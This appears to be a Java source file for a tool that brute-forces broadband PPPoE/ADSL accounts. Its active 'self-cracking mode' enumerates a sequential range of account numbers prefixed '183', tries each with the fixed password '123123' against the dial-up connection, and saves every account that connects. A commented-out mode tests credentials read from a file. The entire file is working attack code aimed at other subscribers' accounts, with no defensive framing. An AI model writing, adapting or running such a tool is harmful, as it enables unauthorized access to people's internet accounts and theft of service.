package javadorpppoe;

public class main {
	//读文件运行模式！
//	public static void main(String[] args) throws Exception {
//
//		FileReadWite fileReadWite=new FileReadWite();
//		String data=fileReadWite.Read();
//		
//	    for(;;){
//	    	
//	    	ConnectNetWork connectNetWork=new ConnectNetWork("宽带连接", data);
//	    	System.out.println("准备测试账号："+data);
//	    	if (connectNetWork.connAdsl()) {
//	    		
//	    		fileReadWite.Write(data);
//	    		
//	    		System.out.println("此账号可用："+data);
//	    		connectNetWork.cutAdsl("宽带连接");
//	    		
//			}else {
//				System.out.println("此账号不可用："+data);
//			}
//	    	
//	    	data=fileReadWite.Read();
//	    	if (data==null) {
//	    		System.out.println("文件测试结束！");
//				break;
//			}
//	    }
//		  	
//	}
	
	//自破解模式
	public static void main(String[] args) throws Exception {
		FileReadWite fileReadWite=new FileReadWite();
		
		long number=34570440;//基数
		long end=34571924;
		
		String data="183"+String.valueOf(number)+" "+"123123";
		
	    for(;;){
    	
    	ConnectNetWork connectNetWork=new ConnectNetWork("宽带连接", data);
    	System.out.println("准备测试账号："+data);
    	if (connectNetWork.connAdsl()) {
    		
    		fileReadWite.Write(data);
    		
    		System.out.println("此账号可用："+data);
    		connectNetWork.cutAdsl("宽带连接");
    		
		}else {
			System.out.println("此账号不可用："+data);
		}
    	number++;
        data="183"+String.valueOf(number)+" "+"123123";
    	
    	if (number>end) {
			break;
		}
    }
		
	}

}
